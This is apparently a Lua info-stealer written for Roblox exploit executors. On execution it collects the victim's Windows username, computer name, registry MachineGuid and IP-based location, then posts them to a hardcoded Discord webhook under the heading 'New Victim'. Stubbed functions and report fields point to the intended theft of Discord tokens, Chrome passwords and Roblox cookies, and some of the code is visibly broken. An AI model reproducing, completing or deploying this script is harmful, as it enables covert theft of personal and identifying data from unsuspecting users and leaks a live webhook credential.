
local ffi = require("ffi")
local json = game:GetService("HttpService")
local http = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (request) or (function() error("No HTTP support") end)
local lfs = (isfile and isfolder and writefile and delfile) and true or false

local WEBHOOK_URL = "https://discord.com/api/webhooks/1495247089800843364/vqsAe2jXiLCBm6M0rJs-WpHLONsDBTZn7O4LVgUUID3Lc8QO8Q3lzP7mybP_1XU8oGoj"

ffi.cdef[[
typedef unsigned long       DWORD;
typedef unsigned short      WORD;
typedef unsigned char       BYTE;
typedef BYTE               *LPBYTE;
typedef unsigned long       ULONG_PTR;
typedef ULONG_PTR           HANDLE;
typedef const wchar_t      *LPCWSTR;
typedef wchar_t            *LPWSTR;
typedef DWORD             *LPDWORD;

int MultiByteToWideChar(UINT, DWORD, const char*, int, wchar_t*, int);

int GetUserNameA(char* lpBuffer, LPDWORD pcbBuffer);
int GetComputerNameA(char* lpBuffer, LPDWORD nSize);
int GetModuleFileNameA(void* hModule, char* lpFilename, DWORD nSize);

DWORD ExpandEnvironmentStringsA(const char* lpSrc, char* lpDst, DWORD nSize);

typedef void* HKEY;
int RegOpenKeyExA(HKEY hKey, const char* lpSubKey, DWORD ulOptions, DWORD samDesired, HKEY* phkResult);
int RegQueryValueExA(HKEY hKey, const char* lpValueName, DWORD* lpReserved, DWORD* lpType, LPBYTE lpData, DWORD* lpcbData);
int RegCloseKey(HKEY hKey);
]]

local advapi32 = ffi.load("Advapi32")
local kernel32 = ffi.load("kernel32")

local function getenv(var)
    local size = 32767
    local buffer = ffi.new("char[?]", size)
    local n = kernel32.ExpandEnvironmentStringsA("%"..var.."%", buffer, size)
    if n > 1 then
        local s = ffi.string(buffer)
        s = s:gsub("%%"..var.."%%", "")
        return s
    end
    if var == "USERPROFILE" then
        return "C:\\Users\\" .. (os.getComputerName and os.getComputerName() or "Unknown")
    elseif var == "APPDATA" then
        return getenv("USERPROFILE").."\\AppData\\Roaming"
    elseif var == "COMPUTERNAME" then
        return (os.getComputerName and os.getComputerName() or "Unknown")
    elseif var == "USERNAME" or var == "UserName" then
        return (os.getUserName and os.getUserName() or "Unknown")
    end
    return ""
end

local function getUserName()
    local sz = ffi.new("DWORD[1]", 256)
    local buf = ffi.new("char[256]")
    if kernel32.GetUserNameA(buf, sz) == 1 then
        return ffi.string(buf)
    end
    return getenv("USERNAME") or "Unknown"
end

local function getCompName()
    local sz = ffi.new("DWORD[1]", 256)
    local buf = ffi.new("char[256]")
    if kernel32.GetComputerNameA(buf, sz) == 1 then
        return ffi.string(buf)
    end
    return getenv("COMPUTERNAME") or "Unknown"
end

local function fileExists(path)
    local suc, err = pcall(function() return readfile and readfile(path) end)
    if suc and err~=nil then return true end
    return isfile and isfile(path)
end

local function readAll(path)
    return (readfile and readfile(path)) or ""
end

local function writeAll(path, content)
    if writefile then writefile(path, content) end
end

local function get_mac_address()
    local ipinfo = ''
    local suc,data = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if suc and data and type(data)=="string" and data:find("query") then
        return "NotFound"
    end
    if not suc then return "NotFound" end
    return "NotFound"
end

local function get_hwid()
    local HKEY_LOCAL_MACHINE = ffi.cast("HKEY", 0x80000002)
    local subkey = "SOFTWARE\\Microsoft\\Cryptography"
    local value = "MachineGuid"
    local hkResult = ffi.new("HKEY[1]")
    if advapi32.RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, 0x20019, hkResult)==0 then
        local hKey = hkResult[0]
        local outBuf = ffi.new("char[128]")
        local bufLen = ffi.new("DWORD[1]", 128)
        if advapi32.RegQueryValueExA(hKey, value, nil, nil, outBuf, bufLen)==0 then
            advapi32.RegCloseKey(hKey)
            return ffi.string(outBuf)
        end
        advapi32.RegCloseKey(hKey)
    end
    return "Unknown"
end

local function get_ipinfo()
    local suc, data = pcall(function()
        return game:HttpGet("http://ip-api.com/json/")
    end)
    if not suc then return "Unknown","Unknown","Unknown" end
    local j = json:JSONDecode(data)
    return j["query"] or "Unknown", j["country"] or "Unknown", j["city"] or "Unknown"
end

local function get_system_info()
    local info = {}
    info["OS"] = "Windows"
    info["OS_Full_Detail"] = info["OS"]
    info["CPU_Name"] = "Unknown"
    info["RAM_Total_Physical"] = "Unknown"
    info["GPU"] = { { Name = "Unknown" } }
    info["NetworkAdapters"] = {}
    return info
end

local function get_browsing_history(tmpdir)
    return {}
end

local function find_discord_tokens()
    return {}
end

local function get_chrome_passwords(tmpdir)
    return {}
end

local function find_roblox_tokens()
    return {}
end

local function table_view(tbl, hdr)
    if type(tbl)~="table" or #tbl==0 then return "" end
    local out={"---"}
    for i,v in ipairs(tbl) do
        local row = {}
        for k,val in pairs(v) do
            table.insert(row, tostring(k)..":"..tostring(val))
        end
        table.insert(out, table.concat(row," | "))
    end
    return table.concat(out,"\n")
end

local function format_system_info(info)
    local out = {}
    for k, v in pairs(info) do
        if type(v)=="table" then
            table.insert(out, k..": " .. json:JSONEncode(v))
        else
            table.insert(out, k..": "..tostring(v))
        end
    end
    return table.concat(out,"\n")
end

local function format_browsing_history(items)
    if not items or #items==0 then return "No browser history found" end
    return table_view(items, {"Time", "Title", "URL"})
end

local function count_password_entries(chrome_pwds)
    if type(chrome_pwds)=="table" and chrome_pwds.passwords then
        return #chrome_pwds.passwords
    end
    return 0
end

local function summary_overview(username, compname, ip, country, city, mac, hwid, discord_tokens, chrome_pwds, roblox_cookies, system_info)
    local ram_total = system_info["RAM_Total_Physical"] or system_info["RAM_Virtual_Total"] or "Unknown"
    local gpus = (system_info["GPU"] and #system_info["GPU"]>0 and system_info["GPU"][1].Name) or "Unknown"
    local cpu = system_info["CPU_Name"] or "Unknown"
    local os_str = system_info["OS_Full_Detail"] or system_info["OS"] or "Unknown"
    local password_count = count_password_entries(chrome_pwds)
    local lines = {
        "Username: "..username,
        "Computer: "..compname,
        "IP: "..ip,
        "Country: "..country,
        "City: "..city,
        "MAC: "..mac,
        "HWID: "..hwid,
        "Discord Tokens Found: "..(discord_tokens and #discord_tokens or 0),
        "Passwords Grabbed: "..tostring(password_count),
        "Roblox Cookies Found: "..(roblox_cookies and "Yes" or "No"),
        "OS: "..os_str,
        "CPU: "..cpu,
        "RAM (Total): "..tostring(ram_total),
        "GPU(s): " .. tostring(gpus),
    }
    return table.concat(lines,"\n")
end

local function discord_webhook_send(content)
    http({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json:JSONEncode({content = content})
    })
end

local function collect_and_send()
    local ip, country, city = get_ipinfo()
    local mac = get_mac_address()
    local hwid = get_hwid()
    local system_info = get_system_info()
    local discord_tokens = find_discord_tokens()
    local roblox_cookies = find_roblox_tokens()

    local username = getUserName()
    local compname = getCompName()

    local location_address = "N/A (use Python for WiFi/IP geolocate)"

    local overview = summary_overview(
        username, compname, ip, country, city, mac, hwid,
        discord_tokens, {}, roblox_cookies, system_info
    )
    local content = "**New Victim**\n"
        .."**Username:** "..username.."\n"
        .."**Computer:** "..compname.."\n"
        .."**IP:** "..ip.."\n"
        .."**Country:** "..country.."\n"
        .."**City:** "..city.."\n"
        .."**MAC:** "..mac.."\n"
        .."**HWID:** "..hwid.."\n"
        .."**Discord Tokens Found:** "..(discord_tokens and #discord_tokens or 0).."\n"
        .."**Passwords Grabbed:** "..count_password_entries({}).."\n"
        .."**Roblox Cookies Found:** "..(roblox_cookies and "Yes" or "No").."\n"
        .."**OS:** "..(system_info["OS"] or "Unknown").."\n"
        .."**CPU:** "..(system_info["CPU_Name"] or "Unknown").."\n"
        .."**RAM (Total):** "..tostring(system_info["RAM_Total_Physical"] or "Unknown").."\n"
        .."**GPU(s):** "..((system_info["GPU"] and #system_info["GPU"]>0 and system_info["GPU"][1].Name) or "Unknown").."\n"
        .."**Address/Location (Detailed):** \n```\n"..location_address.."\n```"

    discord_webhook_send(content)
end

collect_and_send()
